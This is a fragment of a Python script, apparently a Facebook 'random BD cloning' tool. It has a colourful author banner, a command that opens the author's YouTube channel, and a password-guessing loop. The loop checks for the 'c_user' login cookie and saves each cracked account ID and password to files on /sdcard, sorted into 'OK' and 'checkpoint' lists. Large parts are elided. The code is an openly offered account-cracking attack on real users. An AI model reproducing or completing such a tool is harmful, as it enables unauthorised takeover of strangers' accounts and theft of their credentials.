...
os.system('xdg-open https://youtube.com/@TUHINvai')

def clear():
    os.system('clear')
    print(logo)
logo = """
\033[1;91m༄TUHIN•───────────────────────────────────────•༄KING᭄
...
\033[1;91m▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ᴹᴿ°᭄TUHIN▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ 
\033[1;32m          ➠AUTHOR     ; TUHIN AHMED
\033[1;33m          ➠FACEBOOK   ; Tuhin Ahmed
\033[1;33m          ➠GITHUB     ;TUHIN- AHMMED
\033[1;32m          ➠TOOLS      ;RANDOM BD CLONING
\033[1;35m          ➠YOUTUBE    ;TUHIN
\x1b[1;37m          ➠KING       ;TUHIN
\033[1;91m▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ᴹᴿ°᭄TUHIN▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ ▄ """
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m══════════════════════════════════════════')
                print('\r\033[1;32m[✓] STATUS   :TUHIN_OK💉')
                ...
                open('/sdcard/TUHIN-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(idf + '|' + pw)
                break
                ...
                print('\r\033[1;32m══════════════════════════════════════════')
                open('/sdcard/TUHIN-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(idf + '|' + pw)
                break
